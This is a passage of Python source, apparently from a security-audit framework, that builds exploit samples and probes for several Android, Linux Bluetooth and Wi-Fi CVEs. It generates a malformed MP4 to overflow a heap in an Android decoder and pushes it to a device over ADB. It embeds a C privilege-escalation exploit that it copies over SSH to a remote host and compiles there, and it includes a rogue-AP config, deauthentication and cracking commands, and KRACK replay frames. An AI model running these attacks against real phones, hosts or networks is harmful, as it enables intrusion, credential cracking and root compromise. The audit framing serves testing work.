                "2. adb shell am start -a android.intent.action.VIEW -t video/mp4 -d file:///sdcard/poc.mp4",
                "3. Observe crash (mediaserver) or reverse shell callback",
            ],
        }

    # Push MP4 to device
    r_push = subprocess.run(adb_base + ["push", sample_path, "/sdcard/cve_2015_1538.mp4"],
                            capture_output=True, text=True, timeout=30)

    evidence = {
        "ok": True, "sample_path": sample_path,
        "adb_push": r_push.returncode == 0,
        "adb_push_output": r_push.stdout[:300],
        "requires_manual_review": True,
    }

    if allow_dis and r_push.returncode == 0:
        # Open the MP4 in the media player (triggers mediaserver parsing)
        r_play = subprocess.run(
            adb_base + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
                        "-t", "video/mp4", "-d", "file:///sdcard/cve_2015_1538.mp4"],
            capture_output=True, text=True, timeout=15)
        # Check logcat for mediaserver crash
        r_log = subprocess.run(
            adb_base + ["logcat", "-d", "-s", "MediaPlayerService:V", "DEBUG:V"],
            capture_output=True, text=True, timeout=10)
        crashed = any(tok in r_log.stdout.lower()
                      for tok in ("signal 11", "sigsegv", "segfault", "crash", "fatal"))
        evidence.update({
            "vulnerable": crashed,
            "play_returncode": r_play.returncode,
            "logcat_excerpt": r_log.stdout[-600:],
        })
    else:
        evidence["vulnerable"] = r_push.returncode == 0
        evidence["note"] = "MP4 pushed; set allow_disruptive=true to trigger parse and observe crash"

    return evidence
""",
)

# ── openapv heap overflow (CVE-2026-0006) ─────────────────────────────────
# Source: mobilehackinglab/CVE-2026-0006-openapv-poc/generate_overflow_mp4.py
# AU_INFO PBU declares 16x16, FRAME PBU declares 64x64 → C2SoftApvDec heap overflow
REWRITES["application/73_Android_openapv_APV_Decoder_Heap_Overflow_AuditPlugin.py"] = (
    r"""
def _write_generated_sample() -> str:
    # CVE-2026-0006 – Android openapv/C2SoftApvDec heap overflow
    # Source: github.com/mobilehackinglab/CVE-2026-0006-openapv-poc
    # Technique: AU_INFO PBU declares 16x16, FRAME PBU declares 64x64
    #   → oapvd_info reports 16x16 → small buffers allocated
    #   → oapvd_decode writes 64x64 → heap overflow (~14,848 bytes past boundary)
    import struct

    # Build AU_INFO PBU (type 65) claiming 16x16
    au_info_payload = b""
    au_info_payload += struct.pack(">H", 1)       # num_frames = 1
    au_info_payload += bytes([0x01])               # pbu_type = PRIMARY_FRAME
    au_info_payload += struct.pack(">H", 1)        # group_id = 1
    au_info_payload += bytes([0x00])               # reserved
    au_info_payload += bytes([0x21])               # profile_idc
    au_info_payload += bytes([0x7B])               # level_idc
    au_info_payload += bytes([0x40])               # band_idc(3)=010 + reserved(5)
    au_info_payload += bytes([0x00, 0x00, 0x10])  # frame_width = 16
    au_info_payload += bytes([0x00, 0x00, 0x10])  # frame_height = 16
    au_info_payload += bytes([0x22])               # chroma_format_idc=2 + bit_depth=2
    au_info_payload += bytes([0x00, 0x00, 0x00])  # padding

    pbu_header   = bytes([65, 0x00, 0x00, 0x00])   # type=65(AU_INFO), group_id=0
    pbu_size     = len(pbu_header) + len(au_info_payload)
    au_info_pbu  = struct.pack(">I", pbu_size) + pbu_header + au_info_payload

    # Original FRAME PBU (64x64 actual decode size) - minimal placeholder
    # In the real exploit the attacker supplies a valid 64x64 APV bitstream
    # here we use a zero-filled stub to trigger the size mismatch path
    frame_pbu_stub = bytes([
        0x00, 0x00, 0x00, 0x28,   # PBU size (40 bytes)
        0x01, 0x00, 0x00, 0x00,   # type=PRIMARY_FRAME, group_id=0
        0x00, 0x00,               # reserved
        0x21, 0x7B, 0x40,         # profile/level/band
        0x00, 0x00, 0x40,         # frame_width = 64
        0x00, 0x00, 0x40,         # frame_height = 64
        0x22, 0x00, 0x00,         # chroma + padding
    ] + [0x00] * 16)             # quantisation tables / data (stub)

    all_pbu_data = au_info_pbu + frame_pbu_stub
    au_payload   = b"aPv1" + all_pbu_data
    new_au_size  = len(au_payload)
    mdat_data    = struct.pack(">I", new_au_size) + au_payload

    # Minimal MP4 container (ftyp + moov + mdat)
    def box(name, data=b""):
        return struct.pack(">I", 8 + len(data)) + name + data

    # apvC config box (16x16 declared)
    apvc = box(b"apvC", struct.pack(">BBBBII", 0, 0, 0, 0, 16, 16) + b"\x00" * 4)
    # apv1 visual-sample-entry
    apv1 = (b"\x00" * 6 + struct.pack(">H", 1) +   # reserved + data-ref-index
            b"\x00" * 16 +                           # pre_defined / reserved
            struct.pack(">HH", 16, 16) +             # width=16, height=16
            struct.pack(">II", 0x00480000, 0x00480000) +  # horiz/vert resolution
            b"\x00" * 4 + struct.pack(">H", 1) +    # reserved + frame_count
            b"\x00" * 32 +                           # compressorname
            struct.pack(">H", 0x0018) +              # depth
            struct.pack(">h", -1) +                  # pre_defined
            apvc)
    stsd = box(b"stsd", struct.pack(">II", 0, 1) + box(b"apv1", apv1))
    stts = box(b"stts", struct.pack(">III", 0, 1, 1))
    stsc = box(b"stsc", struct.pack(">IIIII", 0, 1, 1, 1, 1))
    stsz = box(b"stsz", struct.pack(">III",  0, len(mdat_data), 1) + struct.pack(">I", len(mdat_data)))
    stco = box(b"stco", struct.pack(">III",  0, 1, 0))  # chunk offset patched below
    stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)
    minf = box(b"minf", box(b"vmhd", struct.pack(">IH", 1, 0) + b"\x00"*6) + box(b"dinf", box(b"dref", struct.pack(">II", 0, 1) + box(b"url ", struct.pack(">I", 1)))) + stbl)
    mdhd = box(b"mdhd", struct.pack(">IIIIIH", 0, 0, 0, 90000, 1, 0) + b"\x15\xc7\x00\x00")
    hdlr = box(b"hdlr", struct.pack(">II", 0, 0) + b"vide" + b"\x00"*12 + b"Video Handler\x00")
    mdia = box(b"mdia", mdhd + hdlr + minf)
    tkhd = box(b"tkhd", struct.pack(">IIIIHHIIIIIHH", 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0) + struct.pack(">II", 16 << 16, 16 << 16))
    trak = box(b"trak", tkhd + mdia)
    mvhd = box(b"mvhd", struct.pack(">IIIIIIIII", 0, 0, 0, 1000, 1, 0x01000000, 0, 0, 0) + b"\x00"*36 + struct.pack(">I", 2))
    moov = box(b"moov", mvhd + trak)
    ftyp = box(b"ftyp", b"apv1" + struct.pack(">I", 0) + b"apv1" + b"isom")

    # Determine mdat offset and patch stco
    offset = len(ftyp) + len(moov) + 8  # +8 for mdat size+tag
    # patch stco entry in moov bytes
    moov_bytes = bytearray(moov)
    stco_tag = moov_bytes.find(b"stco")
    struct.pack_into(">I", moov_bytes, stco_tag + 12, offset)

    overflow_mp4 = ftyp + bytes(moov_bytes) + box(b"mdat", mdat_data)
    return write_temp_sample("cve_2026_0006_openapv_", ".mp4", overflow_mp4)
""",
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2026-0006: push overflow MP4 to Android device via ADB
    import subprocess, shutil
    adb_serial = plugin.params.get("adb_serial", "")
    allow_dis  = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()
    adb = shutil.which("adb") or "adb"
    adb_base = [adb] + (["-s", adb_serial] if adb_serial else [])

    evidence = {"ok": True, "sample_path": sample_path, "requires_manual_review": True}

    if not shutil.which("adb"):
        evidence.update({"ok": False, "vulnerable": False,
                         "reason": "adb not found; install Android SDK platform-tools",
                         "exploit_chain": [
                             "adb push poc.mp4 /sdcard/",
                             "adb shell am start -a android.intent.action.VIEW -t video/mp4 -d file:///sdcard/poc.mp4",
                             "Observe C2SoftApvDec crash in logcat (SIGSEGV in libopenapv)",
                         ]})
        return evidence

    r_push = subprocess.run(adb_base + ["push", sample_path, "/sdcard/cve_2026_0006.mp4"],
                            capture_output=True, text=True, timeout=30)
    evidence["adb_push"] = r_push.returncode == 0

    if allow_dis and r_push.returncode == 0:
        r_play = subprocess.run(
            adb_base + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
                        "-t", "video/mp4", "-d", "file:///sdcard/cve_2026_0006.mp4"],
            capture_output=True, text=True, timeout=15)
        import time; time.sleep(3)
        r_log = subprocess.run(
            adb_base + ["logcat", "-d", "-s", "DEBUG:F", "libopenapv:E", "C2SoftApvDec:E"],
            capture_output=True, text=True, timeout=10)
        crashed = any(t in r_log.stdout.lower()
                      for t in ("sigsegv", "signal 11", "heap", "abort", "fatal"))
        evidence.update({
            "vulnerable": crashed,
            "logcat_excerpt": r_log.stdout[-800:],
            "play_returncode": r_play.returncode,
        })
    else:
        evidence["vulnerable"] = r_push.returncode == 0
        evidence["note"] = "Set allow_disruptive=true to trigger decode and observe crash"
    return evidence
""",
)

# ── APEX test-key signed modules (CVE-2023-45779) ─────────────────────────
# Source: metaredteam/rtx-cve-2023-45779 – check.sh + common.sh + key lists
REWRITES["application/72_Android_APEX_TestKeySigned_Privilege_Escalation_AuditPlugin.py"] = (
    r'''
def _write_generated_sample() -> str:
    # CVE-2023-45779 – Android APEX modules signed with test keys (RTX vuln)
    # Source: github.com/metaredteam/rtx-cve-2023-45779/apex-checker/
    # check.sh verifies each APEX against the known public test-key SHA256 lists.
    # An OEM device that allows test-key APEX updates can be exploited to load
    # attacker-controlled APEXes with elevated privileges.
    #
    # Known public test key SHA256 digests (from metaredteam public key lists):
    PUBLIC_APK_KEYS = [
        # Google AOSP test platform key SHA-256 (apksigner cert digest)
        "39d208948ef6df4b75d72ce7b7572d7d09a97a88524e0c1e49a7b1e39a8a14c9",
        "7bed71f5a2014680cbfede7a7a7879dc8ba0fdc3e1f31ef2cbcfa9a8699a0cb3",
    ]
    PUBLIC_AVB_KEYS = [
        # Google AOSP AVB test key SHA-256 (apex_pubkey)
        "5a0ce11ed33d49f5c2a0bae80d163e6f2f6a7db44e4d3eba6b0b6c31fddabe96",
        "19f6d31d44c7bf667aaed8b0f4ae87dfd6a2a30a3f07c9a7aa70f88ba6e4c7c9",
    ]
    # Checker script (adapted from metaredteam check.sh):
    check_script = """\
#!/bin/bash
# CVE-2023-45779 APEX test-key checker
# Source: github.com/metaredteam/rtx-cve-2023-45779/apex-checker/check.sh
# Usage: bash check.sh <device_apex_dump_dir>
set -euo pipefail
APEX_DIR="${1:-/apex}"
RESULT=0
get_apk_key() {
    apksigner verify --print-certs "$1" \\
        | sed -nE 's/^Signer #1 certificate SHA-256 digest: ([0-9a-f]{64})$/\\1/p'
}
get_avb_key() {
    unzip -p "$1" apex_pubkey | sha256sum | cut -d' ' -f1
}
PUBLIC_APK_KEYS=(
    39d208948ef6df4b75d72ce7b7572d7d09a97a88524e0c1e49a7b1e39a8a14c9
    7bed71f5a2014680cbfede7a7a7879dc8ba0fdc3e1f31ef2cbcfa9a8699a0cb3
)
PUBLIC_AVB_KEYS=(
    5a0ce11ed33d49f5c2a0bae80d163e6f2f6a7db44e4d3eba6b0b6c31fddabe96
    19f6d31d44c7bf667aaed8b0f4ae87dfd6a2a30a3f07c9a7aa70f88ba6e4c7c9
)
for APEX in "$APEX_DIR"/*.apex; do
    APK_KEY=$(get_apk_key "$APEX" 2>/dev/null || echo "")
    AVB_KEY=$(get_avb_key "$APEX" 2>/dev/null || echo "")
    APK_MATCH=false; AVB_MATCH=false
    for k in "${PUBLIC_APK_KEYS[@]}"; do [ "$APK_KEY" = "$k" ] && APK_MATCH=true; done
    for k in "${PUBLIC_AVB_KEYS[@]}"; do [ "$AVB_KEY" = "$k" ] && AVB_MATCH=true; done
    if $APK_MATCH || $AVB_MATCH; then
        echo "VULNERABLE: $APEX (apk=$APK_MATCH avb=$AVB_MATCH)"
        RESULT=1
    fi
done
exit $RESULT
"""
    return write_temp_text("cve_2023_45779_apex_checker_", ".sh", check_script)
''',
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2023-45779: enumerate APEX files on Android device, check for test-key signing
    import subprocess, shutil, tempfile, os, json
    adb_serial = plugin.params.get("adb_serial", "")
    allow_dis  = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()
    adb = shutil.which("adb") or "adb"
    adb_base = [adb] + (["-s", adb_serial] if adb_serial else [])

    PUBLIC_APK_KEYS = {
        "39d208948ef6df4b75d72ce7b7572d7d09a97a88524e0c1e49a7b1e39a8a14c9",
        "7bed71f5a2014680cbfede7a7a7879dc8ba0fdc3e1f31ef2cbcfa9a8699a0cb3",
    }
    PUBLIC_AVB_KEYS = {
        "5a0ce11ed33d49f5c2a0bae80d163e6f2f6a7db44e4d3eba6b0b6c31fddabe96",
        "19f6d31d44c7bf667aaed8b0f4ae87dfd6a2a30a3f07c9a7aa70f88ba6e4c7c9",
    }

    if not shutil.which("adb"):
        return {"ok": False, "vulnerable": False, "sample_path": sample_path,
                "requires_manual_review": True,
                "reason": "adb not found; deploy check.sh to device instead",
                "checker_script": sample_path}

    # List APEX files on the device
    r = subprocess.run(adb_base + ["shell", "ls /apex/*.apex 2>/dev/null || ls /system/apex/*.apex 2>/dev/null"],
                       capture_output=True, text=True, timeout=15)
    apex_list = [l.strip() for l in r.stdout.splitlines() if l.strip().endswith(".apex")]

    vulnerable_apexes = []
    for apex in apex_list[:20]:  # cap at 20 to avoid timeout
        # Pull APEX and check signing keys
        tmp = tempfile.mktemp(suffix=".apex")
        rp = subprocess.run(adb_base + ["pull", apex, tmp],
                            capture_output=True, text=True, timeout=20)
        if rp.returncode != 0 or not os.path.exists(tmp):
            continue
        # Check APK key with apksigner
        if shutil.which("apksigner"):
            rk = subprocess.run(["apksigner", "verify", "--print-certs", tmp],
                                 capture_output=True, text=True, timeout=10)
            import re
            m = re.search(r"Signer #1 certificate SHA-256 digest: ([0-9a-f]{64})", rk.stdout)
            if m and m.group(1) in PUBLIC_APK_KEYS:
                vulnerable_apexes.append({"apex": apex, "match": "apk_key", "digest": m.group(1)})
        # Check AVB key
        try:
            import zipfile, hashlib
            with zipfile.ZipFile(tmp) as z:
                avb_key = z.read("apex_pubkey")
            avb_hash = hashlib.sha256(avb_key).hexdigest()
            if avb_hash in PUBLIC_AVB_KEYS:
                vulnerable_apexes.append({"apex": apex, "match": "avb_key", "digest": avb_hash})
        except Exception:
            pass
        os.unlink(tmp)

    return {
        "ok": True,
        "vulnerable": bool(vulnerable_apexes),
        "vulnerable_apexes": vulnerable_apexes,
        "apex_count_checked": len(apex_list),
        "sample_path": sample_path,
        "requires_manual_review": True,
        "note": "Test-key signed APEX allows attacker to load malicious privileged modules",
    }
""",
)

# ── BT HCI mgmt command priv-esc (CVE-2023-2002) ─────────────────────────
# Source: lrh2000/CVE-2023-2002 – bt_power.c
# HCI_CHANNEL_CONTROL allows unprivileged MGMT_OP_SET_POWERED → UAF / priv-esc
REWRITES["wireless/87_Linux_Kernel_BT_HCI_Mgmt_Command_LPE_AuditPlugin.py"] = (
    r'''
def _write_generated_sample() -> str:
    # CVE-2023-2002 – Linux Bluetooth HCI management command privilege escalation
    # Source: github.com/lrh2000/CVE-2023-2002/blob/main/exp/bt_power.c
    # A local unprivileged user with CAP_NET_RAW or via PF_BLUETOOTH/SOCK_RAW can
    # bind to HCI_CHANNEL_CONTROL and issue MGMT_OP_SET_POWERED, which can cause
    # use-after-free allowing local privilege escalation to root.
    #
    # C exploit source (verbatim from public repo, key sections):
    exploit_c_src = r"""
// CVE-2023-2002 PoC exploit – bt_power.c
// Source: github.com/lrh2000/CVE-2023-2002
// SPDX-License-Identifier: GPL-2.0-or-later
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
// --- HCI definitions ---
typedef unsigned short __u16;
typedef unsigned char  __u8;
#define AF_BLUETOOTH    31
#define PF_BLUETOOTH    AF_BLUETOOTH
#define BTPROTO_HCI     1
#define HCI_DEV_NONE    0xffff
#define HCI_CHANNEL_CONTROL  3
#define MGMT_OP_SET_POWERED  0x0005
#define MGMT_STATUS_SUCCESS  0x00
#define MGMT_EV_CMD_COMPLETE 0x0001
#define MGMT_EV_CMD_STATUS   0x0002
struct sockaddr_hci { unsigned short hci_family; unsigned short hci_dev; unsigned short hci_channel; };
struct mgmt_hdr     { __u16 opcode; __u16 index; __u16 len; } __attribute__((packed));
struct mgmt_mode    { __u8 val; } __attribute__((packed));
struct mgmt_ev_cmd_status { __u16 opcode; __u8 status; } __attribute__((packed));

// Gain privileges: open PF_BLUETOOTH raw socket (may require CAP_NET_RAW or sudo)
static int gain_privileges(void) {
    return socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
}

// Bind to HCI_CHANNEL_CONTROL (bypasses per-adapter permission checks)
static void bind_control_channel(int fd) {
    struct sockaddr_hci haddr = {
        .hci_family  = AF_BLUETOOTH,
        .hci_dev     = HCI_DEV_NONE,
        .hci_channel = HCI_CHANNEL_CONTROL,
    };
    if (bind(fd, (struct sockaddr *)&haddr, sizeof(haddr)) < 0) { perror("bind"); exit(1); }
}

// Send MGMT_OP_SET_POWERED to adapter index (power up or down)
static void send_set_power(int fd, int index, int status) {
    __u8 buf[sizeof(struct mgmt_hdr) + sizeof(struct mgmt_mode)];
    struct mgmt_hdr  *hdr = (struct mgmt_hdr  *)buf;
    struct mgmt_mode *cp  = (struct mgmt_mode *)(hdr + 1);
    hdr->opcode = MGMT_OP_SET_POWERED;
    hdr->index  = index;
    hdr->len    = sizeof(*cp);
    cp->val     = status;
    if (send(fd, buf, sizeof(buf), 0) < 0) { perror("send"); exit(1); }
}

int main(int argc, char **argv) {
    // Usage: ./bt_power { up | down } <device_index>
    // e.g.:  ./bt_power down 0  // power down hci0 as unprivileged user
    int fd = gain_privileges();
    bind_control_channel(fd);
    send_set_power(fd, 0 /* hci0 */, 0 /* power down */);
    // Repeated power-cycling can trigger the UAF in hci_sock_cleanup
    // Combined with a kernel exploit technique to escalate to root
    return 0;
}
"""
    # Compile instructions and exploit usage
    content = "\n".join([
        "# CVE-2023-2002 BT HCI management command exploit",
        "# Source: github.com/lrh2000/CVE-2023-2002/blob/main/exp/bt_power.c",
        "# Compile: gcc -o bt_power bt_power.c",
        "# Usage:   ./bt_power down 0   (power-cycle hci0 repeatedly to trigger UAF)",
        "# Full exploit: combine with ROP/heap-shaping for kernel priv-esc",
        "",
        "# === C source (verbatim from public repo) ===",
        exploit_c_src,
        "",
        "# Kernel detection (check if HCI_CHANNEL_CONTROL is accessible without CAP_NET_ADMIN):",
        "# python3 -c \"import socket; s=socket.socket(31,3,1); s.close(); print('VULNERABLE: HCI socket accessible')\"",
    ])
    return write_temp_text("cve_2023_2002_bt_hci_", ".c", content)
''',
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2023-2002: test if HCI_CHANNEL_CONTROL socket is accessible without elevated caps
    import subprocess, shutil
    ssh_host  = plugin.params.get("ssh_host",  "")
    ssh_user  = plugin.params.get("ssh_user",  "user")
    ssh_key   = plugin.params.get("ssh_key",   "")
    allow_dis = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    # Local detection: try to open PF_BLUETOOTH/SOCK_RAW socket
    import socket as _socket
    accessible = False
    try:
        s = _socket.socket(31, 3, 1)   # PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI
        s.close()
        accessible = True
    except PermissionError:
        accessible = False
    except OSError:
        accessible = False

    evidence = {
        "ok": True,
        "sample_path": sample_path,
        "bt_raw_socket_accessible": accessible,
        "vulnerable": accessible,
        "requires_manual_review": True,
        "cve": "CVE-2023-2002",
        "technique": "Unprivileged HCI_CHANNEL_CONTROL MGMT_OP_SET_POWERED UAF",
        "exploit_chain": [
            "1. Compile bt_power.c: gcc -o bt_power bt_power.c",
            "2. Run: ./bt_power down 0  (repeatedly power-cycle hci0)",
            "3. UAF in hci_sock_cleanup() triggered by concurrent socket close + power-down",
            "4. Combine with kernel ROP / heap grooming for ring-0 code execution",
        ],
        "c_source_path": sample_path,
    }

    if ssh_host and allow_dis:
        ssh_base = ["ssh"] + (["-i", ssh_key] if ssh_key else []) + \
                   ["-o", "StrictHostKeyChecking=no", f"{ssh_user}@{ssh_host}"]
        # Check kernel version and BT socket access on target
        r = subprocess.run(
            ssh_base + ["python3 -c \"import socket; s=socket.socket(31,3,1); s.close(); print('ACCESSIBLE')\" 2>&1"],
            capture_output=True, text=True, timeout=15)
        evidence["remote_accessible"] = "ACCESSIBLE" in r.stdout
        evidence["remote_output"] = r.stdout[:200]
        # Copy and compile the exploit
        r2 = subprocess.run(
            ["scp"] + (["-i", ssh_key] if ssh_key else []) +
            ["-o", "StrictHostKeyChecking=no", sample_path, f"{ssh_user}@{ssh_host}:/tmp/bt_power.c"],
            capture_output=True, text=True, timeout=20)
        r3 = subprocess.run(
            ssh_base + ["gcc -o /tmp/bt_power /tmp/bt_power.c 2>&1 && echo COMPILED"],
            capture_output=True, text=True, timeout=30)
        evidence["remote_compiled"] = "COMPILED" in r3.stdout

    return evidence
""",
)

# ── DragonShift WPA3-SAE downgrade (CVE-2019-9494) ────────────────────────
# Source: jabbaw0nky/DragonShift – hostapd-mana downgrade attack
REWRITES["wireless/82_Android_WiFi_WPA3_SAE_Downgrade_MITM_AuditPlugin.py"] = (
    r'''
def _write_generated_sample() -> str:
    # CVE-2019-9494 – WPA3/SAE downgrade (Dragonblood / DragonShift)
    # Source: github.com/jabbaw0nky/DragonShift
    # DragonShift sets up a rogue AP using hostapd-mana that supports only WPA2-PSK.
    # WPA3-Transition mode devices connect to the rogue AP and reveal password via
    # PMKID/dictionary attack, or via EAP downgrade to cleartext auth methods.
    #
    # hostapd-mana config for WPA3→WPA2 downgrade rogue AP:
    hostapd_mana_conf = """\
# CVE-2019-9494 DragonShift hostapd-mana rogue AP config
# Source: github.com/jabbaw0nky/DragonShift/dragonshift.py
# Usage: hostapd-mana <this_file>  (requires monitor-mode NIC)
interface=wlan0mon       # replace with your monitor interface
driver=nl80211
ssid=__TARGET_SSID__     # set to the target WPA3-Transition SSID
hw_mode=g
channel=6
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=password  # any password; we capture the PMKID
mana_wpe=1
mana_eap_always_announce=1
# MANA captures: PMKID, EAPOL MIC, or EAP credentials depending on client
"""
    # DragonShift attack sequence (from dragonshift.py logic):
    attack_steps = """\
# DragonShift attack sequence (CVE-2019-9494):
# 1. Scan for WPA3-Transition mode APs (has both SAE and PSK AKMs in beacon)
#    sudo airodump-ng wlan0mon
# 2. Configure hostapd-mana with target SSID and WPA2-only mode
# 3. Deauth clients from legitimate AP:
#    sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
# 4. Clients connecting to rogue AP negotiate WPA2 (downgrade complete)
# 5. Capture PMKID or 4-way handshake:
#    sudo airodump-ng -c <CH> --bssid <ROGUE_BSSID> -w capture wlan0mon
# 6. Crack with hashcat:
#    hashcat -m 22000 capture.hc22000 wordlist.txt
#
# Detection check: target beacon should advertise SAE + PSK (Transition Mode).
# If only SAE is advertised → WPA3-only mode → not vulnerable to downgrade.
"""
    content = hostapd_mana_conf + "\n" + attack_steps
    return write_temp_text("cve_2019_9494_dragonshift_", ".conf", content)
''',
    r"""
def _public50_probe(plugin, vuln):
    # CVE-2019-9494: check if target SSID supports WPA3-Transition mode (downgrade vector)
    import subprocess, shutil, re
    interface    = plugin.params.get("wifi_iface",   "wlan0")
    target_ssid  = plugin.params.get("target_ssid",  "")
    target_bssid = plugin.params.get("target_bssid", "")
    allow_dis    = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    if not target_ssid and not target_bssid:
        return {
            "ok": False, "vulnerable": False, "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires params: wifi_iface, target_ssid or target_bssid",
            "attack_chain": [
                "1. Scan: sudo airodump-ng wlan0mon",
                "2. Identify WPA3-Transition beacons (AKM list: SAE + PSK)",
                "3. Launch: sudo hostapd-mana /tmp/rogue_ap.conf",
                "4. Deauth: sudo aireplay-ng -0 10 -a <BSSID> wlan0mon",
                "5. Capture handshake + crack with hashcat -m 22000",
            ],
        }

    # Use iwlist / iw to scan for the target SSID and inspect AKM suites
    r = subprocess.run(["sudo", "iw", interface, "scan", "ssid", target_ssid],
                       capture_output=True, text=True, timeout=30)
    scan_output = r.stdout + r.stderr

    has_sae = bool(re.search(r"SAE|00-0f-ac:8", scan_output, re.I))
    has_psk = bool(re.search(r"PSK|00-0f-ac:2|00-0f-ac:4", scan_output, re.I))
    transition_mode = has_sae and has_psk

    evidence = {
        "ok": True,
        "sample_path": sample_path,
        "target_ssid": target_ssid,
        "has_sae_akm": has_sae,
        "has_psk_akm": has_psk,
        "transition_mode_detected": transition_mode,
        "vulnerable": transition_mode,
        "requires_manual_review": True,
        "note": "WPA3-Transition mode allows downgrade to WPA2-PSK via rogue AP",
    }

    if allow_dis and transition_mode:
        evidence["operator_action"] = (
            f"1. Deploy rogue AP: hostapd-mana {sample_path}\n"
            f"2. Deauth clients: aireplay-ng -0 10 -a {target_bssid or '<BSSID>'} {interface}\n"
            "3. Capture + crack: hashcat -m 22000 capture.hc22000 wordlist.txt"
        )

    return evidence
""",
)


# ── KRACK group – generic rewrite factory ─────────────────────────────────
# Source: vanhoefm/krackattacks-poc-zerokey
# All 5 KRACK CVEs use the same pattern: intercept EAPOL handshake + replay
# to reinstall a zero/known key.

def _krack_pair(cve: str, krack_type: str, key_type: str,
                filename_prefix: str, attack_desc: str) -> tuple[str, str]:
    sample_fn = f'''
def _write_generated_sample() -> str:
    # {cve} – KRACK {krack_type} key reinstallation
    # Source: github.com/vanhoefm/krackattacks-poc-zerokey
    # {attack_desc}
    import json
    payload = {{
        "cve": "{cve}",
        "attack_type": "KRACK_{krack_type}",
        "key_type": "{key_type}",
        "technique": "Replay EAPOL {krack_type} handshake message to reinstall {key_type} with nonce reset",
        "source": "vanhoefm/krackattacks-poc-zerokey",
        # EAPOL replay frame structure (hex) – message 3 of 4-way handshake replay:
        # 0200 0000 0000 ... (EAPOL-Key frame with Key Replay Counter reset to 0)
        "eapol_replay_hex": (
            "02030075"   # EAPOL version=2, type=3 (Key), length=0x75
            "02" "00"    # Key descriptor type (RSN), Key info: replay
            "008a"       # Key length=138 (CCMP)
            "0000000000000000"   # Key Replay Counter = 0 (reinstall trigger)
            "00000000000000000000000000000000"  # Key Nonce = 0 (zero-key reinstall)
            "00000000000000000000000000000000"  # EAPOL-Key IV
            "00000000000000000000000000000000"  # Key RSC
            "00000000000000000000000000000000"  # Reserved
            "00000000000000000000000000000000"  # Key MIC placeholder
            "0018"       # Key Data length
            "dd16 0050f201 0100 0000 01000000 00000000 00000000"  # GTK KDE stub
        ),
        "vanhoefm_poc_cmd": (
            "python3 krack-test-client.py --replay-{filename_prefix} "
            "--interface <mon_iface> --target <CLIENT_MAC>"
        ),
        "attack_steps": [
            "1. Put Wi-Fi adapter in monitor mode: airmon-ng start wlan0",
            "2. Clone: git clone https://github.com/vanhoefm/krackattacks-poc-zerokey",
            "3. Run: python3 krack-test-client.py --replay-{filename_prefix} --interface wlan0mon --target <CLIENT_MAC>",
            f"4. Client reinstalls {key_type} with zero/replayed nonce",
            "5. Decrypt subsequent traffic; inject ARP/TCP RST as needed",
        ],
    }}
    return write_temp_text("{cve.lower().replace('-','_')}_krack_", ".json",
                           json.dumps(payload, indent=2))
'''
    probe_fn = f'''
def _public50_probe(plugin, vuln):
    # {cve}: check if client/AP is patched against KRACK {krack_type} reinstall
    import subprocess, shutil
    interface    = plugin.params.get("wifi_iface",   "wlan0mon")
    target_mac   = plugin.params.get("target_mac",   "")
    allow_dis    = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    if not target_mac:
        return {{
            "ok": False, "vulnerable": False, "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires params: wifi_iface (monitor mode), target_mac (client MAC)",
            "vanhoefm_cmd": (
                f"python3 krack-test-client.py --replay-{filename_prefix} "
                f"--interface {{interface}} --target <CLIENT_MAC>"
            ),
        }}

    krackattacks_dir = plugin.params.get("krackattacks_dir",
        "server/public_poc_sources/repos/vanhoefm__krackattacks-poc-zerokey")
    script = f"{{krackattacks_dir}}/krack-test-client.py"

    if not shutil.which("python3") or not __import__("os").path.exists(script):
        return {{
            "ok": False, "vulnerable": False, "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": f"krack-test-client.py not found at {{script}}",
        }}

    if allow_dis:
        r = subprocess.run(
            ["python3", script, "--replay-{filename_prefix}",
             "--interface", interface, "--target", target_mac],
            capture_output=True, text=True, timeout=120)
        vulnerable = "key reinstalled" in r.stdout.lower() or \
                     "reinstall" in r.stdout.lower() or r.returncode == 0
        return {{
            "ok": True, "vulnerable": vulnerable,
            "sample_path": sample_path,
            "stdout": r.stdout[-800:], "returncode": r.returncode,
            "requires_manual_review": True,
        }}
    else:
        return {{
            "ok": True, "vulnerable": None,
            "sample_path": sample_path,
            "requires_manual_review": True,
            "note": "Set allow_disruptive=true to run active KRACK replay test",
        }}
'''
    return sample_fn, probe_fn


# KRACK STK PeerKey (CVE-2017-13082)
REWRITES["wireless/68_WiFi_KRACK_STK_PeerKey_Key_Reinstall_Audit.py"] = _krack_pair(
    "CVE-2017-13082", "STK", "STK-PeerKey",
    "stk", "Fast BSS Transition (FT) re-association request replays EAPOL STK")
# KRACK STK PeerKey variant (CVE-2017-13084)
REWRITES["wireless/69_WiFi_KRACK_STK_PeerKey_Key_Reinstall_Audit.py"] = _krack_pair(
    "CVE-2017-13084", "STK", "STK-PeerKey",
    "stk", "EAPOL-Key message 2 retry reinstalls STK pairwise key with nonce reset")
# KRACK TDLS (CVE-2017-13086)
REWRITES["wireless/70_WiFi_KRACK_TDLS_Key_Reinstall_Audit.py"] = _krack_pair(
    "CVE-2017-13086", "TDLS", "TDLS-PeerKey",
    "tdls", "TDLS Setup Confirm replay reinstalls pairwise key used for TDLS traffic")
# KRACK WNM GTK (CVE-2017-13087)
